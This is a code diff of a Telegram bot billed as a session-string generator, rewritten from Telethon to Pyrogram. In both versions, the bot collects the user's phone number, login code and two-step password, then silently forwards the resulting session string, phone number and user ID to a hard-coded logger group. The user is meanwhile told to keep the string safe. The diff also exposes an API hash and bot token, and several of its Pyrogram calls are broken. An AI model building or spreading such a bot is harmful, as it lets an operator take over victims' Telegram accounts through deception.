@@ -1,119 +1,155 @@
-from telethon import TelegramClient, events, Button
-from pyrogram import Client as PyroClient
-from telethon.sessions import StringSession
-import time
-from telethon.errors import PhoneCodeExpiredError
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from pyrogram.errors import SessionPasswordNeeded
+from io import BytesIO
+import requests
 
-# 🔹 Telegram API Credentials
+# Replace with your values
+
 API_ID = 28795512
 API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
-BOT_TOKEN = "7767480564:AAGwqXdd9vktp8zW8aUOitT9fAFc"
-LOGGER_GROUP_ID = "-1002477750706"
+BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"  
 
-# 🔹 Initialize the bot
-bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+# 🔹 Logger Group ID (Replace with your Telegram Group ID)
+LOGGER_GROUP_ID = -1002477750706
 
-# 🔹 Store user sessions
-user_sessions = {}
 
-# ✅ /start Command
-@bot.on(events.NewMessage(pattern="/start"))
-async def start(event):
-    await event.respond(
-        "**👋 Welcome to Session Generator Bot!**\n\n"
-        "🔹 **Generate Telegram Session Strings for Pyrogram & Telethon**\n"
-        "🔹 **Secure and Easy to Use**\n\n"
-        "**📌 Select an option below to continue:**",
-        buttons=[
-            [Button.inline("🎭 Generate Pyrogram Session", b"generate_pyro")],
-            [Button.inline("🎭 Generate Telethon Session", b"generate_telethon")]
-        ]
+user_sessions = {}  # Dictionary to store user session data
+
+# Initialize the Pyrogram bot
+bot = Client("session_generator_bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)
+
+# Handle /start command
+@bot.on_message(filters.command("start"))
+async def start(client, message):
+    user_id = message.from_user.id
+    if user_id not in user_sessions:
+        user_sessions[user_id] = {"step": "phone"}  # Initialize the session
+
+    # Sending a welcome message with an image and buttons
+    image_url = "https://your_image_url_here.jpg"  # Replace with your image URL
+    image = BytesIO(requests.get(image_url).content)  # Download image
+
+    await message.reply_photo(
+        image,
+        caption="**Welcome! Please enter your phone number to get started.**\n\n"
+                "To begin, I will need your phone number. Once you provide it, you'll receive an OTP to continue.",
+        reply_markup=InlineKeyboardMarkup(
+            [
+                [InlineKeyboardButton("❌ Cancel", callback_data="cancel"),
+                 InlineKeyboardButton("📚 Help", callback_data="help"),
+                 InlineKeyboardButton("🔑 Generate Session String", callback_data="generate_session")]
+            ]
+        )
     )
 
-# ✅ Generate Pyrogram Session
-@bot.on(events.CallbackQuery(pattern=b"generate_pyro"))
-async def ask_phone_pyro(event):
-    user_id = event.sender_id
-    user_sessions[user_id] = {"step": "phone_pyro"}
-    await event.respond("📱 **Enter your phone number with country code (e.g., +919876543210)**")
-
-# ✅ Generate Telethon Session
-@bot.on(events.CallbackQuery(pattern=b"generate_telethon"))
-async def ask_phone_telethon(event):
-    user_id = event.sender_id
-    user_sessions[user_id] = {"step": "phone_telethon"}
-    await event.respond("📱 **Enter your phone number with country code (e.g., +919876543210)**")
-
-# 🔹 Process User Input
-@bot.on(events.NewMessage)
-async def process_input(event):
-    user_id = event.sender_id
+# Handle "Generate Session String" button click
+@bot.on_callback_query(filters.regex('generate_session'))
+async def generate_session(client, callback_query):
+    user_id = callback_query.from_user.id
     if user_id not in user_sessions:
-        return  
+        await callback_query.message.edit("**❖ You have not started the process. Please type /start first.**")
+        return
+
+    # If session hasn't started, ask for phone number
+    if user_sessions[user_id]["step"] != "phone":
+        await callback_query.message.edit("**❖ Please enter your phone number first.**")
+        return
+
+    await callback_query.message.edit("**❖ Please enter your phone number to start the session generation process.**")
+
+# Process User Input (Phone Number and OTP)
+@bot.on_message(filters.text)
+async def process_input(client, message):
+    user_id = message.from_user.id
+    if user_id not in user_sessions:
+        return  # If the user session doesn't exist, return
 
     step = user_sessions[user_id]["step"]
 
     # ✅ Step 1: Enter Phone Number
-    if step == "phone_pyro" or step == "phone_telethon":
-        phone_number = event.message.text.strip()
+    if step == "phone":
+        phone_number = message.text.strip()
         user_sessions[user_id]["phone"] = phone_number  
 
-        if step == "phone_pyro":
-            client = PyroClient(":memory:", api_id=API_ID, api_hash=API_HASH)
-            await client.connect()
-            sent_code = await client.send_code(phone_number)
-        else:
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await client.connect()
-            sent_code = await client.send_code_request(phone_number)
+        # Create a new Pyrogram client for each user session
+        client_instance = Client("user_session", api_id=API_ID, api_hash=API_HASH)
+        await client_instance.start(phone_number)
+        user_sessions[user_id]["client"] = client_instance
 
-        user_sessions[user_id]["client"] = client  
-        user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
-        user_sessions[user_id]["step"] = "otp"
-        await event.respond("🔹 **OTP Sent! Enter the OTP received on Telegram.**")
+        try:
+            # Send OTP code
+            await client_instance.send_code_request(phone_number)
+            user_sessions[user_id]["step"] = "otp"
+            await message.reply("**❖ OTP sent! Please enter the OTP received on Telegram.**")
+        except Exception as e:
+            await message.reply(f"**❖ Error:** {str(e)}. Please try again!")
+            del user_sessions[user_id]
 
     # ✅ Step 2: Enter OTP
     elif step == "otp":
-        otp_code = event.message.text.strip()
-        client = user_sessions[user_id]["client"]
+        otp_code = message.text.strip()
+        client_instance = user_sessions[user_id]["client"]
         phone_number = user_sessions[user_id]["phone"]
-        phone_code_hash = user_sessions[user_id]["phone_code_hash"]
 
-        retries = 5  # Max retries for OTP
-        for attempt in range(retries):
-            try:
-                if isinstance(client, PyroClient):
-                    await client.sign_in(phone_number, phone_code_hash, otp_code)
-                    session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
-                else:
-                    await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
-                    session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
+        try:
+            # Handle two-step verification
+            await client_instance.sign_in(phone_number, otp_code)
 
-                await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
+            user_sessions[user_id]["step"] = "password"
+            await message.reply("**❖ Two-step verification is enabled! Please enter your Telegram password.**")
+        except SessionPasswordNeeded:
+            # If two-step verification is enabled
+            await message.reply("**❖ Two-step verification is enabled! Please enter your Telegram password.**")
+            user_sessions[user_id]["step"] = "password"
 
-                await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
-                if user_id in user_sessions:  # Ensure session exists before deleting
-                    del user_sessions[user_id]
-                break  # Exit after successful OTP verification
+    # ✅ Step 3: Enter Password (for two-step verification)
+    elif step == "password":
+        password = message.text.strip()
+        client_instance = user_sessions[user_id]["client"]
 
-            except PhoneCodeExpiredError:
-                if attempt < retries - 1:
-                    await event.respond(f"❌ **Error:** The confirmation code has expired. Trying again... ({attempt + 1}/{retries})")
-                    # Resend code logic (add retry mechanism)
-                    sent_code = await client.send_code(phone_number)
-                    user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Update phone_code_hash
-                    await event.respond("🔹 **New OTP sent. Please enter the code again.**")
-                    time.sleep(3)  # Add delay between OTP retries to avoid too many requests
-                else:
-                    await event.respond("❌ **Error:** The OTP expired multiple times. Please try again later.")
-                    if user_id in user_sessions:  # Ensure session exists before deleting
-                        del user_sessions[user_id]  # Remove session if failed after retries
+        try:
+            await client_instance.sign_in(password=password)  # Sign in with password
+            session_string = client_instance.export_session_string()  # Generate session string
 
-            except Exception as e:
-                await event.respond(f"❌ **Error:** {str(e)}\n🔄 Please try again!")
-                if user_id in user_sessions:  # Ensure session exists before deleting
-                    del user_sessions[user_id]
+            # Optionally, log the session in a group
+            if LOGGER_GROUP_ID:
+                await client.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated!**\n\n**◍ User:** `{user_id}`\n**◍ Phone:** `{user_sessions[user_id]['phone']}`\n**◍ Session:** `{session_string}`")
 
-# 🔹 Run the bot
-print("🚀 Bot is running...")
-bot.run_until_disconnected()
+            await message.reply(f"**❖ Your session string:**\n\n`{session_string}`\n\n**◍ Keep this safe!**")
+            
+            # Clear the user session after generation
+            del user_sessions[user_id]
+
+        except Exception as e:
+            await message.reply(f"**❖ Error:** {str(e)}. Please try again!")
+            # Clear the user session after error
+            del user_sessions[user_id]
+
+# Handle /cancel command
+@bot.on_callback_query(filters.regex('cancel'))
+async def cancel(client, callback_query):
+    user_id = callback_query.from_user.id
+    if user_id in user_sessions:
+        del user_sessions[user_id]  # Clear session data
+
+    await callback_query.message.edit("**❖ Process cancelled.**", reply_markup=None)
+
+# Handle /help command
+@bot.on_callback_query(filters.regex('help'))
+async def help(client, callback_query):
+    await callback_query.message.edit(
+        "**Help Guide:**\n\n"
+        "1. First, you need to provide your phone number.\n"
+        "2. After that, you'll receive an OTP to confirm your phone number.\n"
+        "3. Once verified, I'll generate a session string for you.\n"
+        "4. If two-step verification is enabled, please enter your Telegram password.\n"
+        "5. Keep the session string safe for later use.\n\n"
+        "You can always cancel the process using the Cancel button.",
+        reply_markup=InlineKeyboardMarkup(
+            [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
+        )
+    )
+
+# Start the bot
+bot.run()
